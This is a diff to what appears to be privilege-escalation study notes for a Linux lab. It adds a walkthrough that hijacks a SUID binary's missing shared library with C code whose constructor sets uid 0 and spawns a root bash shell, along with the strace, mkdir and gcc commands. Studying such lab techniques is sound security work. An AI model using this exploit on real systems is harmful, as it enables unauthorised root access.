@@ -77,7 +77,28 @@ Google exploits for SUID binaries e.g. [exim-4.84-3](https://www.exploit-db.com/
 
 1. Run **strace** on the file and search the output for open/access calls and for "no such file" errors:
 `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
-2. 
+Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
+`open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)`
+2. Create the **.config** directory for the missing libcalc.so file:
+`mkdir /home/user/.config`
+3. Compile  code that will spawn a bash shell into a shared object at the location the **suid-so** executable was looking for it:
+```c
+user@debian:~$ cat /home/user/tools/suid/libcalc.c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`
+4. Execute the **suid-so** executable again, and note that this time, instead of a progress bar, we get a root shell.
+`/usr/local/bin/suid-so`
+
+
 
 
 
